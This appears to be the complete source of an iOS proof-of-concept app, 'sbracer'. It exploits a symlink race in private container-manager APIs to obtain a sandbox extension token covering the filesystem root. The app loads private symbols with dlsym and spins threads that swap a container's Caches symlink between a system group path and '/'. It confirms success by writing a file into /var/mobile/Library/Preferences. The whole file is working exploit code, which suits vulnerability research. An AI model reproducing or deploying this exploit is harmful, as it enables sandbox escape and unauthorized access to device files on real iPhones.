// sbracer — race the MCM part-directory symlink between a valid container and /
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <pthread.h>
#import <sys/stat.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_group;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_get_path q_path;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;
static NSString *gGroup, *gPart, *gValid;
static volatile int gStop = 0, gWin = 0;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbracer] %@", s);
}

static BOOL loadMCM(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) return NO;
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_group = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_path = (fn_get_path)dlsym(h, "container_object_get_path");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    return q_create && q_get && q_token && s_consume;
}

static NSString *findGroup(void) {
    NSArray *ids = @[@"group.8e0bc870a21520b9.1", @"group.8e0bc870a21520b9.2",
                     @"group.8e0bc870a21520b9.3", @"group.8e0bc870a21520b9.4",
                     @"group.8e0bc870a21520b9.5"];
    for (NSString *gid in ids) {
        NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid];
        if (u.path.length) { return gid; }
    }
    return nil;
}

static int64_t query(NSString **pathOut) {
    void *q = q_create();
    q_class(q, 7);
    void *x = xpc_string ? xpc_string(gGroup.UTF8String) : NULL;
    q_group(q, x);
    q_part(q, 3);
    q_flags(q, 0x8000000000ULL);
    void *res = q_get(q);
    const char *p = (res && q_path) ? q_path(res) : NULL;
    char *tok = (res && q_token) ? q_token(res) : NULL;
    int64_t h = (tok && s_consume) ? s_consume(tok) : -5;
    if (pathOut) *pathOut = p ? [NSString stringWithUTF8String:p] : nil;
    if (tok) free(tok);
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
    return h;
}

static BOOL testWin(void) {
    const char *pref = "/var/mobile/Library/Preferences";
    DIR *d = opendir(pref);
    if (!d) return NO;
    closedir(d);
    NSString *m = @"/var/mobile/Library/Preferences/sbracer_marker";
    int fd = open(m.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd < 0) return NO;
    write(fd, "win", 3); close(fd);
    L(@"WIN: wrote %@", m);
    unlink(m.fileSystemRepresentation);
    return YES;
}

static void *swapper(void *arg) {
    (void)arg;
    NSString *a = [gPart stringByAppendingString:@".a"];
    NSString *b = [gPart stringByAppendingString:@".b"];
    while (!gStop) {
        unlink(a.fileSystemRepresentation);
        symlink("/", a.fileSystemRepresentation);
        rename(a.fileSystemRepresentation, gPart.fileSystemRepresentation);
        unlink(b.fileSystemRepresentation);
        symlink(gValid.fileSystemRepresentation, b.fileSystemRepresentation);
        rename(b.fileSystemRepresentation, gPart.fileSystemRepresentation);
    }
    return NULL;
}

static void *racer(void *arg) {
    (void)arg;
    for (int i = 0; i < 20000 && !gStop; i++) {
        NSString *p = nil;
        int64_t h = query(&p);
        if (h >= 0) {
            if (testWin()) { gWin = 1; gStop = 1; }
            if (s_release) s_release(h);
        }
        if (gWin) break;
    }
    return NULL;
}

static void runProbe(void) {
    @autoreleasepool {
        L(@"=== sbracer start uid=%d pid=%d", getuid(), getpid());
        if (!loadMCM()) { L(@"MCM fail"); return; }
        gGroup = findGroup();
        if (!gGroup) { L(@"no group"); return; }
        NSString *root = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
        gPart = [root stringByAppendingPathComponent:@"Library/Caches"];
        gValid = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        NSFileManager *fm = [NSFileManager defaultManager];
        [fm createDirectoryAtPath:[gPart stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
        [fm removeItemAtPath:gPart error:nil];
        symlink(gValid.fileSystemRepresentation, gPart.fileSystemRepresentation);
        L(@"group=%@ part=%@ valid=%@", gGroup, gPart, gValid);
        L(@"pre opendir prefs=%p errno=%d", opendir("/var/mobile/Library/Preferences"), errno);
        NSString *p0 = nil;
        int64_t h0 = query(&p0);
        L(@"static query token=%lld path=%@", (long long)h0, p0 ?: @"(null)");
        if (h0 >= 0) {
            L(@"static win? %d", testWin());
            if (s_release) s_release(h0);
        }
        pthread_t t1, t2, t3;
        pthread_create(&t1, NULL, swapper, NULL);
        pthread_create(&t2, NULL, swapper, NULL);
        pthread_create(&t3, NULL, racer, NULL);
        pthread_join(t3, NULL);
        gStop = 1;
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        L(@"=== sbracer done win=%d ===", gWin);
        unlink(gPart.fileSystemRepresentation);
        symlink(gValid.fileSystemRepresentation, gPart.fileSystemRepresentation);
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *l = [[UILabel alloc] initWithFrame:vc.view.bounds];
    l.text = @"sbracer"; l.textAlignment = NSTextAlignmentCenter;
    [vc.view addSubview:l];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
